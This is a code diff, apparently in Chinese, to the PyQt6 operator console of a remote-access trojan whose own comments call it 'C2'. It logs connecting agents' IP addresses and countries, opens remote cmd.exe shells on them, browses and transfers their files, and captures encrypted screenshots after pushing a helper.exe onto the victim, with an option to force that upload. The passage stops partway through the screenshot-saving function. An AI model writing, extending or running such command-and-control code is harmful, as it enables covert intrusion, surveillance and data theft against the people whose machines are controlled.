@@ -7,12 +7,13 @@ import base64
 import time
 import struct
 import random
+import traceback
 from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
                              QInputDialog, QFileDialog, QProgressBar, QColorDialog,
-                             QMessageBox)
+                             QMessageBox, QCheckBox)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
 from PyQt6.QtGui import QColor, QPixmap
 
@@ -45,6 +46,17 @@ DARK_PROGRESS_CHUNK = "#00aa00"
 def log_console(msg: str):
     ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
     print(f"[{ts}] {msg}", flush=True)
+
+
+def hexdump_short(data: bytes, maxlen: int = 16) -> str:
+    """短字节预览，用于日志"""
+    if data is None:
+        return "None"
+    n = min(len(data), maxlen)
+    s = data[:n].hex()
+    if len(data) > n:
+        s += f"...(总 {len(data)} 字节)"
+    return s
 
 
 def ws_compute_accept(key: bytes) -> bytes:
@@ -107,7 +119,7 @@ def ws_handle_http_upgrade(sock: socket.socket):
     try:
         while True:
             if time.time() - start > 8:
-                log_console("握手超时")
+                log_console("[握手] 超时")
                 return False, "", "", ""
             chunk = sock.recv(1024)
             if not chunk:
@@ -116,17 +128,17 @@ def ws_handle_http_upgrade(sock: socket.socket):
             if b"\r\n\r\n" in buf:
                 break
     except Exception as e:
-        log_console(f"握手读取异常: {e}")
+        log_console(f"[握手] 读取异常: {e}")
         return False, "", "", ""
 
     first_line = buf.split(b"\r\n")[0]
     parts = first_line.split(b" ")
     if len(parts) < 3:
-        log_console(f"握手首行不合法: {first_line}")
+        log_console(f"[握手] 首行不合法: {first_line!r}")
         return False, "", "", ""
     method, path, proto = parts
     if path not in (b"/", b"/ws"):
-        log_console(f"握手路径不匹配: {path}")
+        log_console(f"[握手] 路径不匹配: {path!r}")
         return False, "", "", ""
 
     headers = {}
@@ -145,20 +157,20 @@ def ws_handle_http_upgrade(sock: socket.socket):
     ws_key = headers.get(b"sec-websocket-key")
     ws_version = headers.get(b"sec-websocket-version")
 
-    log_console(f"握手请求: {method.decode(errors='replace')} {path.decode(errors='replace')} "
-                f"IP={real_ip or '(无)'} 国家={country}")
+    log_console(f"[握手] 请求 {method.decode(errors='replace')} "
+                f"{path.decode(errors='replace')} IP={real_ip or '(无)'} 国家={country}")
 
     if conn_val != b"Upgrade":
-        log_console(f"握手失败: Connection 头不是 Upgrade, 实际={conn_val!r}")
+        log_console(f"[握手] 失败 Connection={conn_val!r}")
         return False, real_ip, country, display_name
     if upgrade_val != b"websocket":
-        log_console(f"握手失败: Upgrade 头不是 websocket, 实际={upgrade_val!r}")
+        log_console(f"[握手] 失败 Upgrade={upgrade_val!r}")
         return False, real_ip, country, display_name
     if not ws_key:
-        log_console("握手失败: 缺少 Sec-WebSocket-Key")
+        log_console("[握手] 失败 缺少 Sec-WebSocket-Key")
         return False, real_ip, country, display_name
     if ws_version != b"13":
-        log_console(f"握手失败: Sec-WebSocket-Version 不是 13, 实际={ws_version!r}")
+        log_console(f"[握手] 失败 Version={ws_version!r}")
         return False, real_ip, country, display_name
 
     accept_val = ws_compute_accept(ws_key)
@@ -168,9 +180,9 @@ def ws_handle_http_upgrade(sock: socket.socket):
             b"Sec-WebSocket-Accept: " + accept_val + b"\r\n\r\n")
     try:
         sock.sendall(resp)
-        log_console(f"握手成功: {display_name}")
+        log_console(f"[握手] 成功 {display_name}")
     except Exception as e:
-        log_console(f"握手响应发送失败: {e}")
+        log_console(f"[握手] 响应发送失败: {e}")
         return False, real_ip, country, display_name
     return True, real_ip, country, display_name
 
@@ -181,12 +193,10 @@ class ClientSignals(QObject):
     on_fs = pyqtSignal(object, bytes)
     on_screen = pyqtSignal(object, bytes)
     on_mode = pyqtSignal(object)
-    on_skey = pyqtSignal(object)
     on_helper_needed = pyqtSignal(object)
     on_helper_ack = pyqtSignal(object, bytes)
     on_helper_ready = pyqtSignal(object)
     on_helper_err = pyqtSignal(object, str)
-    on_helper_hok0 = pyqtSignal(object)
 
 
 class ClientSession:
@@ -210,15 +220,18 @@ class ClientSession:
 
     def send_packet(self, body: bytes) -> bool:
         if not self.connected:
+            log_console(f"[发送] {self.display_name} 连接已断开，包丢弃 cmd={body[:4]!r}")
             return False
         try:
             full_body = struct.pack(">I", len(body)) + body
             ws_frame = ws_build_server_frame(True, WS_OP_BINARY, full_body)
             with self._send_lock:
                 self.conn.sendall(ws_frame)
+            log_console(f"[发送] {self.display_name} cmd={body[:4]!r} "
+                        f"body_len={len(body)} ws_len={len(ws_frame)}")
             return True
         except (OSError, BrokenPipeError) as e:
-            log_console(f"发送失败 [{self.display_name}]: {e}")
+            log_console(f"[发送] {self.display_name} 失败: {e}")
             self.close()
             return False
 
@@ -227,7 +240,10 @@ class ClientSession:
         self._frag_opcode = 0
 
     def close(self):
+        if not self.connected:
+            return
         self.connected = False
+        log_console(f"[关闭] {self.display_name}")
         try:
             self.conn.sendall(ws_build_server_frame(True, WS_OP_CLOSE, b""))
         except Exception:
@@ -266,8 +282,8 @@ class RemoteCmdDialog(QDialog):
         lay.addLayout(input_lay)
 
         self.out_box.append(f"==== 连接 {client_session.display_name} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
+        log_console(f"[CMD] 打开会话 {client_session.display_name}，发送 SPAW")
         self.client.send_packet(b"SPAW")
-        log_console(f"CMD会话打开: {client_session.display_name}")
 
         if parent and hasattr(parent, 'is_dark_mode'):
             self.apply_theme(parent.is_dark_mode, parent.fg_color)
@@ -302,18 +318,19 @@ class RemoteCmdDialog(QDialog):
         self.cmd_input.clear()
         if not self.is_alive or not self.client.connected:
             self.out_box.append("\n[!] 连接断开")
-            log_console("CMD命令发送失败: 连接已断开")
+            log_console(f"[CMD] {self.client.display_name} 发送失败：连接已断开")
             return
         payload = b"EXEK" + cmd.encode("gbk", errors="replace")
+        log_console(f"[CMD] {self.client.display_name} 发送命令: {cmd}")
         ok = self.client.send_packet(payload)
         self.out_box.append(f"> {cmd}")
-        log_console(f"CMD命令 [{self.client.display_name}]: {cmd} (发送{'成功' if ok else '失败'})")
         if not ok:
             self.out_box.append("[发送失败]")
+            log_console(f"[CMD] {self.client.display_name} 命令发送失败")
 
     def closeEvent(self, event):
         self.is_alive = False
-        log_console(f"CMD会话关闭: {self.client.display_name}")
+        log_console(f"[CMD] 关闭会话 {self.client.display_name}")
         if self.client.connected:
             self.client.send_packet(b"KILL")
         try:
@@ -388,7 +405,7 @@ class FileManagerDialog(QDialog):
         self.timer.timeout.connect(self.process_fs_events)
         self.timer.start()
 
-        log_console(f"文件管理打开: {client_session.display_name}")
+        log_console(f"[文件管理] 打开 {client_session.display_name}")
         if parent and hasattr(parent, 'is_dark_mode'):
             self.apply_theme(parent.is_dark_mode, parent.fg_color)
 
@@ -470,7 +487,7 @@ class FileManagerDialog(QDialog):
         if cmd == b"FDRV":
             text = payload.decode("gbk", errors="replace")
             drives = [d for d in text.split("|") if d]
-            log_console(f"[文件管理] 收到驱动器列表: {drives}")
+            log_console(f"[文件管理] FDRV 驱动器: {drives}")
             self.tree.clear()
             for d in drives:
                 d_full = d if d.endswith("\\") else d + "\\"
@@ -479,7 +496,7 @@ class FileManagerDialog(QDialog):
 
         elif cmd == b"FDIR":
             text = payload.decode("gbk", errors="replace")
-            log_console(f"[文件管理] 收到目录列表，长度={len(text)}")
+            log_console(f"[文件管理] FDIR 长度={len(text)}")
             self.tree.clear()
             for entry in text.split(";"):
                 if not entry: continue
@@ -502,7 +519,8 @@ class FileManagerDialog(QDialog):
                 self.download_name = parts[0]
                 self.download_total = int(parts[1])
                 self.download_buf = bytearray()
-                log_console(f"[下载] 开始 {self.download_name}, 总大小={self.download_total}")
+                log_console(f"[文件管理] FMET 开始下载 {self.download_name} "
+                            f"总大小={self.download_total}")
                 self.progress_bar.setValue(0)
                 self.progress_label.setText(
                     f"[下载] {self.download_name} 0 / {self.format_size(self.download_total)}")
@@ -510,6 +528,7 @@ class FileManagerDialog(QDialog):
         elif cmd == b"FDAT":
             if len(payload) < 8: return
             if self.download_total == 0:
+                log_console("[文件管理] FDAT 但无下载会话，忽略")
                 return
             offset = struct.unpack("<Q", payload[0:8])[0]
             data = payload[8:]
@@ -543,14 +562,14 @@ class FileManagerDialog(QDialog):
 
         elif cmd == b"FDON":
             if self.download_total == 0:
-                log_console("[下载] 忽略无主 FDON（无对应 FMET）")
+                log_console("[文件管理] 忽略无主 FDON")
                 return
             if len(payload) >= 8:
                 server_total = struct.unpack("<Q", payload[0:8])[0]
             else:
                 server_total = self.download_total
-            log_console(f"[下载] 收到结束标记 FDON, 实际收到={len(self.download_buf)}, "
-                        f"声明总大小={server_total}")
+            log_console(f"[文件管理] FDON 实际收到={len(self.download_buf)} "
+                        f"声明={server_total}")
             self.progress_bar.setValue(100)
             self.finish_download()
 
@@ -559,6 +578,8 @@ class FileManagerDialog(QDialog):
                 if self.upload_inflight > 0:
                     self.upload_inflight -= 1
                 self.upload_acked += 1
+                log_console(f"[文件管理] FACK 已确认={self.upload_acked} "
+                            f"在途={self.upload_inflight}")
                 if self.upload_file and self.upload_sent < self.upload_total:
                     self.send_next_upload_chunk()
                 elif (self.upload_sent >= self.upload_total
@@ -566,7 +587,8 @@ class FileManagerDialog(QDialog):
                       and self.upload_file):
                     self.upload_file.close()
                     self.upload_file = None
-                    log_console(f"[上传完成] {self.upload_path} ({self.upload_total} 字节)")
+                    log_console(f"[文件管理] 上传完成 {self.upload_path} "
+                                f"({self.upload_total} 字节)")
                     self.log("[上传完成]")
                     self.progress_bar.setValue(100)
                     self.progress_label.setText(
@@ -574,18 +596,18 @@ class FileManagerDialog(QDialog):
                     QTimer.singleShot(500, self.on_refresh)
 
         elif cmd == b"FOK0":
-            log_console("[文件管理] 收到 FOK0")
+            log_console("[文件管理] FOK0")
             if self.upload_file and self.upload_sent == 0:
                 self.send_next_upload_chunk()
 
         elif cmd == b"FERR":
             msg = payload.decode("gbk", errors="replace")
-            log_console(f"[文件管理] 收到 FERR: {msg}")
+            log_console(f"[文件管理] FERR: {msg}")
             self.log(f"[错误] {msg}")
 
     def finish_download(self):
         if not self.download_buf:
-            log_console("[下载] 缓冲区为空，取消保存")
+            log_console("[文件管理] 下载缓冲区为空，取消")
             self.download_buf = bytearray()
             self.download_total = 0
             self.download_name = ""
@@ -597,14 +619,12 @@ class FileManagerDialog(QDialog):
             try:
                 with open(save_path, "wb") as f:
                     f.write(self.download_buf)
-                log_console(f"[下载完成] {save_path} ({len(self.download_buf)} 字节)")
-                self.log(f"[下载完成] {save_path} ({len(self.download_buf)} 字节)")
+                log_console(f"[文件管理] 下载完成 {save_path} "
+                            f"({len(self.download_buf)} 字节)")
             except OSError as e:
-                log_console(f"[下载失败] 写入本地文件出错: {e}")
-                self.log(f"[下载失败] {e}")
+                log_console(f"[文件管理] 下载写入失败: {e}")
         else:
-            log_console("[下载取消]")
-            self.log("[下载取消]")
+            log_console("[文件管理] 下载取消")
         self.download_buf = bytearray()
         self.download_total = 0
         self.download_name = ""
@@ -715,17 +735,16 @@ class FileManagerDialog(QDialog):
         try:
             self.upload_file = open(local_path, "rb")
         except OSError as e:
-            log_console(f"[上传失败] 打开本地文件出错: {e}")
-            self.log(f"[上传失败] {e}"); return
+            log_console(f"[文件管理] 上传打开本地文件失败: {e}")
+            return
         self.upload_total = os.path.getsize(local_path)
         self.upload_sent = 0
         self.upload_acked = 0
         self.upload_inflight = 0
         self.upload_path = remote_path
         args = f"{remote_path}|{self.upload_total}"
-        log_console(f"[上传] 开始 {fname} ({self.upload_total} 字节) -> {remote_path}")
+        log_console(f"[文件管理] 开始上传 {fname} ({self.upload_total} 字节) -> {remote_path}")
         self.client.send_packet(b"FPUT" + args.encode("gbk", errors="replace"))
-        self.log(f"[上传] {fname} ({self.upload_total} 字节) -> {remote_path}")
         self.progress_bar.setValue(0)
         self.progress_label.setText(
             f"[上传] 0 / {self.format_size(self.upload_total)} (0%)")
@@ -740,7 +759,7 @@ class FileManagerDialog(QDialog):
             offset = self.upload_sent
             body = b"FDAT" + struct.pack("<Q", offset) + chunk
             if not self.client.send_packet(body):
-                log_console(f"[上传失败] 发送分块失败 offset={offset}")
+                log_console(f"[文件管理] 发送分块失败 offset={offset}")
                 break
             self.upload_sent += len(chunk)
             self.upload_inflight += 1
@@ -751,7 +770,8 @@ class FileManagerDialog(QDialog):
             and self.upload_file):
             self.upload_file.close()
             self.upload_file = None
-            log_console(f"[上传完成] {self.upload_path} ({self.upload_total} 字节)")
+            log_console(f"[文件管理] 上传完成 {self.upload_path} "
+                        f"({self.upload_total} 字节)")
             self.log("[上传完成]")
             self.progress_bar.setValue(100)
             self.progress_label.setText(
@@ -778,20 +798,24 @@ class FileManagerDialog(QDialog):
         self._closing = True
         self.timer.stop()
         if self.client.connected:
-            ok = self.client.send_packet(b"FABT")
-            log_console(f"[FABT] 已发送, 结果={ok}")
+            log_console(f"[文件管理] 关闭，发送 FABT")
+            self.client.send_packet(b"FABT")
         else:
-            log_console("[FABT] 连接已断开，未发送")
+            log_console("[文件管理] 关闭，连接已断开")
         self.reset_transfer_state()
         if self.main_window and self.client in self.main_window.open_file_dialogs:
             if self.main_window.open_file_dialogs[self.client] is self:
                 del self.main_window.open_file_dialogs[self.client]
-        log_console(f"文件管理关闭: {self.client.display_name}")
+        log_console(f"[文件管理] 关闭 {self.client.display_name}")
         super().closeEvent(event)
 
 
 class ScreenPreviewDialog(QDialog):
-    """接收 agent 的 SCRM/SCRV/SCRD（加密分块）"""
+    """桌面/服务两种模式共用同一套 UI 和执行流程。
+    默认：点刷新 -> 发 SCRS(key) -> agent 回 SCRM/SCRV/SCRD 或 HNED
+    收到 HNED -> 上传 helper -> HOK1 后就绪 -> 自动重发 SCRS
+    勾选强制上传：点刷新 -> 直接上传 helper -> HOK1 后就绪 -> 自动发 SCRS
+    """
 
     def __init__(self, client_session: ClientSession, parent=None):
         super().__init__(parent)
@@ -801,15 +825,14 @@ class ScreenPreviewDialog(QDialog):
         self.resize(960, 720)
 
         self._closing = False
-        self._buf = bytearray()
-        self._total = 0
-        self._chunks_received = 0
-        self._chunks_total = 0
-        self._iv = None
-        self._last_pixmap = None
-        self._waiting_after_upload = False
 
-        # helper 上传状态
+        self._total = 0
+        self._iv = None
+        self._chunks_total = 0
+        self._chunks = {}
+        self._plain = None
+        self._last_pixmap = None
+
         self._helper_file = None
         self._helper_total = 0
         self._helper_sent = 0
@@ -817,6 +840,7 @@ class ScreenPreviewDialog(QDialog):
         self._helper_ack_pending = False
         self._helper_waiting_hok0_for_start = False
         self._helper_waiting_hok0_for_done = False
+        self._pending_scrs_after_helper = False
 
         lay = QVBoxLayout(self)
 
@@ -832,13 +856,19 @@ class ScreenPreviewDialog(QDialog):
         info_bar.addWidget(self.btn_save)
         lay.addLayout(info_bar)
 
-        self.status = QLabel("等待截图...")
-        lay.addWidget(self.status)
+        opt_lay = QHBoxLayout()
+        self.chk_force_helper = QCheckBox("强制上传 helper（覆盖 agent 端旧版）")
+        self.chk_force_helper.setChecked(False)
+        opt_lay.addWidget(self.chk_force_helper)
+        opt_lay.addStretch()
+        lay.addLayout(opt_lay)
+
+        self.mode_label = QLabel("")
+        lay.addWidget(self.mode_label)
 
         self.upload_label = QLabel("")
         self.upload_label.setVisible(False)
         lay.addWidget(self.upload_label)
-
         self.upload_bar = QProgressBar()
         self.upload_bar.setRange(0, 100)
         self.upload_bar.setValue(0)
@@ -846,6 +876,17 @@ class ScreenPreviewDialog(QDialog):
         self.upload_bar.setMaximumHeight(18)
         self.upload_bar.setVisible(False)
         lay.addWidget(self.upload_bar)
+
+        self.recv_label = QLabel("")
+        self.recv_label.setVisible(False)
+        lay.addWidget(self.recv_label)
+        self.recv_bar = QProgressBar()
+        self.recv_bar.setRange(0, 100)
+        self.recv_bar.setValue(0)
+        self.recv_bar.setTextVisible(True)
+        self.recv_bar.setMaximumHeight(18)
+        self.recv_bar.setVisible(False)
+        lay.addWidget(self.recv_bar)
 
         self.image_label = QLabel()
         self.image_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
@@ -855,19 +896,29 @@ class ScreenPreviewDialog(QDialog):
 
         self.log_box = QTextEdit()
         self.log_box.setReadOnly(True)
-        self.log_box.setMaximumHeight(80)
+        self.log_box.setMaximumHeight(100)
         lay.addWidget(self.log_box)
 
         if parent and hasattr(parent, 'is_dark_mode'):
             self.apply_theme(parent.is_dark_mode, parent.fg_color)
 
-        log_console(f"截屏窗口打开: {client_session.display_name}")
+        self._update_mode_label()
+        log_console(f"[截屏] 打开窗口 {client_session.display_name}")
+
+    def _update_mode_label(self):
+        if self.client.is_service_mode is True:
+            self.mode_label.setText("模式: 服务（需要 helper）")
+        elif self.client.is_service_mode is False:
+            self.mode_label.setText("模式: 桌面（需要 helper）")
+        else:
+            self.mode_label.setText("模式: 未知")
 
     def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
         if dark:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {DARK_BG}; }}
                 QLabel {{ color: {fg_color}; }}
+                QCheckBox {{ color: {fg_color}; }}
                 QTextEdit {{
                     background-color: {DARK_BG};
                     color: {fg_color};
@@ -895,35 +946,67 @@ class ScreenPreviewDialog(QDialog):
         else:
             self.setStyleSheet("")
 
+    # ---------- 刷新入口 ----------
     def request_screenshot(self):
-        if self._closing or not self.client.connected:
+        log_console(f"[截屏] {self.client.display_name} 收到刷新请求")
+        if self._closing:
+            log_console("[截屏] 窗口已关闭，忽略")
             return
-        self._buf = bytearray()
-        self._total = 0
-        self._chunks_received = 0
-        self._chunks_total = 0
-        self._iv = None
-        self.status.setText("已发送 SCRN，等待数据...")
-        self.log("已发送 SCRN")
-        self.client.send_packet(b"SCRN")
+        if not self.client.connected:
+            log_console("[截屏] 连接已断开，忽略")
+            self.log("连接已断开")
+            return
+        self._reset_recv_state()
 
+        force = self.chk_force_helper.isChecked()
+        log_console(f"[截屏] 强制上传={force}")
+
+        if force:
+            self.log("勾选强制上传，先走上传 helper")
+            self.client.helper_uploaded = False
+            self._pending_scrs_after_helper = True
+            self._start_upload_helper()
+            return
+
+        self.client.shot_key = os.urandom(32)
+        self.log(f"生成新 key: {hexdump_short(self.client.shot_key)}")
+        self.client.send_packet(b"SCRS" + self.client.shot_key)
+        self.recv_label.setText("已发送 SCRS，等待数据...")
+        self.recv_label.setVisible(True)
+        self.recv_bar.setValue(0)
+        self.recv_bar.setVisible(True)
+        self.log("已发送 SCRS（含新密钥）")
+
+    def _reset_recv_state(self):
+        self._total = 0
+        self._iv = None
+        self._chunks_total = 0
+        self._chunks = {}
+        self.recv_bar.setValue(0)
+        self.recv_bar.setVisible(False)
+        self.recv_label.setVisible(False)
+
+    # ---------- helper 上传 ----------
     def on_helper_needed(self):
+        log_console(f"[截屏] {self.client.display_name} 收到 HNED，需要 helper")
         if self._closing:
             return
-        if self.client.helper_uploaded:
-            self.log("已上传过 helper，重发 SCRN")
-            self.client.send_packet(b"SCRN")
-            return
+        if self.client.helper_uploaded and not self.chk_force_helper.isChecked():
+            log_console("[截屏] C2 认为已上传，但 agent 报告缺失，重置状态")
+            self.client.helper_uploaded = False
         if self.client.helper_uploading:
-            self.log("helper 正在上传，忽略")
+            log_console("[截屏] helper 正在上传，忽略")
             return
+        self._pending_scrs_after_helper = True
         self._start_upload_helper()
 
     def _start_upload_helper(self):
         helper_path = os.path.join(self.main_window.base_dir, "helper.exe")
+        log_console(f"[截屏] 准备上传 helper: {helper_path}")
         if not os.path.exists(helper_path):
+            log_console("[截屏] helper.exe 不存在")
             self.log(f"helper.exe 不存在: {helper_path}")
-            self.status.setText("helper.exe 缺失")
+            self.recv_label.setText("helper.exe 缺失")
             return
         size = os.path.getsize(helper_path)
         self.client.helper_uploading = True
@@ -942,11 +1025,13 @@ class ScreenPreviewDialog(QDialog):
         self.client.send_packet(b"HUP0" + struct.pack("<Q", size))
 
     def on_helper_hok0_start(self):
+        log_console("[截屏] 收到 HOK0(start)，开始发 helper 数据")
         self._helper_waiting_hok0_for_start = False
         self._helper_waiting_hok0_for_done = True
         self._send_next_helper_chunk()
 
     def on_helper_hok0_done(self):
+        log_console("[截屏] 收到 HOK0(done)，helper 上传完成")
         self._helper_waiting_hok0_for_done = False
         self.client.helper_uploading = False
         self.client.helper_uploaded = True
@@ -957,20 +1042,24 @@ class ScreenPreviewDialog(QDialog):
 
     def _send_next_helper_chunk(self):
         if self._closing or not self.client.connected:
+            log_console("[截屏] 发送 helper 分块：连接已断")
             return
         if self._helper_ack_pending:
+            log_console("[截屏] 上一块未 ACK，等")
             return
         if not self._helper_file:
+            log_console("[截屏] 无 helper 文件句柄，忽略")
             return
         chunk = self._helper_file.read(HELPER_CHUNK)
         if not chunk:
             self._helper_file.close()
             self._helper_file = None
+            log_console(f"[截屏] helper 数据发完，发 HDON")
             self.client.send_packet(b"HDON")
-            self.log("helper 数据发完，等待 HOK0")
             return
         offset = self._helper_offset
         body = b"HDAT" + struct.pack("<Q", offset) + chunk
+        log_console(f"[截屏] 发送 HDAT offset={offset} len={len(chunk)}")
         self.client.send_packet(body)
         self._helper_offset += len(chunk)
         self._helper_sent += len(chunk)
@@ -981,54 +1070,64 @@ class ScreenPreviewDialog(QDialog):
             f"[上传 helper] {self._helper_sent} / {self._helper_total} 字节 ({pct}%)")
 
     def on_helper_ack(self, offset: bytes):
+        off = struct.unpack("<Q", offset)[0] if len(offset) == 8 else -1
+        log_console(f"[截屏] 收到 HACK offset={off}")
         self._helper_ack_pending = False
         self._send_next_helper_chunk()
 
     def _send_hstr(self):
         if self._closing or not self.client.connected:
             return
+        log_console("[截屏] 发送 HSTR")
         self.client.send_packet(b"HSTR")
-        self.log("已发送 HSTR，等待 HOK1")
 
     def on_helper_ready(self):
-        self.log("helper 已就绪，发送 SCRN")
+        log_console("[截屏] 收到 HOK1，helper 就绪")
         self.upload_label.setVisible(False)
         self.upload_bar.setVisible(False)
-        self.status.setText("helper 就绪，重新发送 SCRN")
-        QTimer.singleShot(200, lambda: self.client.send_packet(b"SCRN"))
+        if self._pending_scrs_after_helper:
+            self._pending_scrs_after_helper = False
+            log_console("[截屏] 补发刷新")
+            QTimer.singleShot(200, self.request_screenshot)
+        else:
+            self.recv_label.setText("helper 就绪，可点击刷新截图")
 
     def on_helper_err(self, msg: str):
+        log_console(f"[截屏] HERR: {msg}")
         self.client.helper_uploading = False
-        self.log(f"helper 错误: {msg}")
         self.upload_label.setText(f"[错误] {msg}")
         self.upload_bar.setVisible(False)
-        self.status.setText("helper 错误")
+        self._pending_scrs_after_helper = False
 
+    # ---------- 接收截图 ----------
     def on_scr_data(self, sess, body: bytes):
         if self._closing:
             return
         if len(body) < 4:
+            log_console(f"[截屏] 收到过短包: {len(body)}")
             return
         cmd = body[0:4]
         payload = body[4:]
 
-        self.log(f"on_scr_data: cmd={cmd!r}, body_len={len(body)}, payload_len={len(payload)}")
-
         if cmd == b"SCRM":
             if len(payload) >= 4:
                 self._total = struct.unpack("<I", payload[0:4])[0]
-                self._buf = bytearray()
-                self._chunks_received = 0
-                self._chunks_total = 0
                 self._iv = None
-                self.status.setText(f"开始接收，总大小 {self._total} 字节")
-                self.log(f"SCRM: total={self._total}")
-
+                self._chunks_total = 0
+                self._chunks = {}
+                self.recv_bar.setValue(0)
+                self.recv_bar.setVisible(True)
+                self.recv_label.setVisible(True)
+                self.recv_label.setText(f"开始接收，总大小 {self._total} 字节")
+                log_console(f"[截屏] SCRM total={self._total}")
+            else:
+                log_console("[截屏] SCRM 载荷不足")
         elif cmd == b"SCRV":
             if len(payload) >= 12:
                 self._iv = payload[0:12]
-                self.log(f"SCRV: iv 已接收")
-
+                log_console(f"[截屏] SCRV iv={hexdump_short(self._iv)}")
+            else:
+                log_console("[截屏] SCRV 载荷不足")
         elif cmd == b"SCRD":
             if len(payload) >= 8:
                 idx = struct.unpack("<I", payload[0:4])[0]
@@ -1036,89 +1135,93 @@ class ScreenPreviewDialog(QDialog):
                 data = payload[8:]
                 if self._chunks_total == 0:
                     self._chunks_total = total_chunks
-                self._buf.extend(data)
-                self._chunks_received += 1
-                self.status.setText(
-                    f"接收中 {self._chunks_received}/{self._chunks_total} 块，"
-                    f"累计 {len(self._buf)}/{self._total} 字节")
-                self.log(f"SCRD: {self._chunks_received}/{self._chunks_total}, buf={len(self._buf)}")
-                if self._total > 0 and len(self._buf) >= self._total:
+                    log_console(f"[截屏] 首块，声明总块数={total_chunks}")
+                self._chunks[idx] = data
+                got = len(self._chunks)
+                if self._chunks_total > 0:
+                    pct = got * 100 // self._chunks_total
+                    if pct > 100: pct = 100
+                    self.recv_bar.setValue(pct)
+                    self.recv_label.setText(
+                        f"接收中 {got}/{self._chunks_total} 块 ({pct}%)")
+                log_console(f"[截屏] SCRD idx={idx} size={len(data)} "
+                            f"got={got}/{self._chunks_total}")
+                if self._chunks_total > 0 and got >= self._chunks_total:
+                    log_console("[截屏] 全部块到齐，开始解密")
                     self._finalize_scrx()
-
-        # 老的 SCRX（如果 agent 还发的话，兼容）
+            else:
+                log_console("[截屏] SCRD 载荷不足")
         elif cmd == b"SCRX":
-            self.log(f"SCRX（老格式）")
+            log_console(f"[截屏] 收到老格式 SCRX len={len(payload)}")
             if len(payload) >= 16:
                 clen = struct.unpack("<I", payload[0:4])[0]
                 iv = payload[4:16]
                 cipher = payload[16:16+clen]
                 if len(cipher) != clen:
-                    self.log(f"SCRX 长度不匹配")
+                    log_console("[截屏] SCRX 长度不匹配")
                     return
                 if not self.client.shot_key or not HAS_AESGCM:
-                    self.log("缺少解密条件")
+                    log_console("[截屏] 缺少解密条件")
                     return
                 try:
                     aesgcm = AESGCM(self.client.shot_key)
                     plain = aesgcm.decrypt(iv, cipher, None)
+                    log_console(f"[截屏] SCRX 解密成功 plain_len={len(plain)}")
                 except Exception as e:
-                    self.log(f"解密失败: {e}")
+                    log_console(f"[截屏] SCRX 解密失败: {e}")
                     return
-                pix = QPixmap()
-                if not pix.loadFromData(plain, "JPEG"):
-                    self.log("JPEG 解码失败")
-                    return
-                self._last_pixmap = pix
-                self._display_pixmap()
-                self.status.setText(f"完成 {pix.width()}x{pix.height()}")
-                self.log(f"完成（SCRX 老格式）")
-                self.btn_save.setEnabled(True)
-                self._buf = bytearray(plain)
+                self._plain = plain
+                self._show_plain(plain, "SCRX 老格式")
 
     def _finalize_scrx(self):
-        """SCRD 收满后，用 shot_key 解密并显示"""
         if not self.client.shot_key:
-            self.log("没有 shot key，无法解密")
-            self.status.setText("缺少解密密钥")
+            log_console("[截屏] 解密失败：无 shot_key")
+            self.recv_label.setText("缺少解密密钥")
             return
         if not HAS_AESGCM:
-            self.log("cryptography 库未安装，无法解密")
-            self.status.setText("缺少 cryptography 库")
+            log_console("[截屏] 解密失败：cryptography 未安装")
+            self.recv_label.setText("缺少 cryptography 库")
             return
         if not self._iv:
-            self.log("没有 iv，无法解密")
-            self.status.setText("缺少 iv")
+            log_console("[截屏] 解密失败：无 IV")
+            self.recv_label.setText("缺少 iv")
+            return
+        try:
+            cipher = b"".join(self._chunks[i] for i in range(self._chunks_total))
+        except KeyError as e:
+            log_console(f"[截屏] 分块不完整，缺 idx={e}")
+            self.recv_label.setText("分块不完整")
+            return
+        if len(cipher) != self._total:
+            log_console(f"[截屏] 密文长度不匹配 期望={self._total} 实际={len(cipher)}")
+            self.recv_label.setText("密文长度不匹配")
             return
         try:
             aesgcm = AESGCM(self.client.shot_key)
-            plain = aesgcm.decrypt(self._iv, bytes(self._buf), None)
-            self.log(f"解密成功: plain_len={len(plain)}")
+            plain = aesgcm.decrypt(self._iv, cipher, None)
+            log_console(f"[截屏] 解密成功 plain_len={len(plain)}")
         except Exception as e:
-            self.log(f"解密失败: {e}")
-            self.status.setText("解密失败")
+            log_console(f"[截屏] 解密失败: {e}")
+            self.recv_label.setText("解密失败")
             return
-        pix = QPixmap()
-        if not pix.loadFromData(plain, "JPEG"):
-            self.log("JPEG 解码失败")
-            self.status.setText("解码失败")
-            return
-        self._last_pixmap = pix
-        self._display_pixmap()
-        self.status.setText(f"完成 {pix.width()}x{pix.height()}，{len(plain)} 字节")
-        self.log(f"完成（分块解密），尺寸={pix.width()}x{pix.height()}，{len(plain)} 字节")
-        self.btn_save.setEnabled(True)
-        self._buf = bytearray(plain)
+        self._plain = plain
+        self._show_plain(plain, "分块解密")
 
-    def _finalize(self):
+    def _show_plain(self, plain: bytes, src: str):
         pix = QPixmap()
-        if not pix.loadFromData(bytes(self._buf), "JPEG"):
-            self.log("JPEG 解码失败")
-            self.status.setText("解码失败")
-            return
+        if not pix.loadFromData(plain, "PNG"):
+            log_console("[截屏] PNG 解码失败，尝试 JPEG")
+            if not pix.loadFromData(plain, "JPEG"):
+                log_console("[截屏] PNG/JPEG 都失败")
+                self.recv_label.setText("图像解码失败")
+                return
         self._last_pixmap = pix
         self._display_pixmap()
-        self.status.setText(f"完成 {pix.width()}x{pix.height()}，{len(self._buf)} 字节")
-        self.log(f"完成，尺寸={pix.width()}x{pix.height()}，{len(self._buf)} 字节")
+        self.recv_bar.setValue(100)
+        self.recv_label.setText(
+            f"完成 {pix.width()}x{pix.height()}，{len(plain)} 字节")
+        log_console(f"[截屏] 完成（{src}）尺寸={pix.width()}x{pix.height()} "
+                    f"字节={len(plain)}")
         self.btn_save.setEnabled(True)
 
     def _display_pixmap(self):
@@ -1137,18 +1240,20 @@ class ScreenPreviewDialog(QDialog):
         self._display_pixmap()
 
     def save_screenshot(self):
-        if not self._buf:
+        if not self._plain:
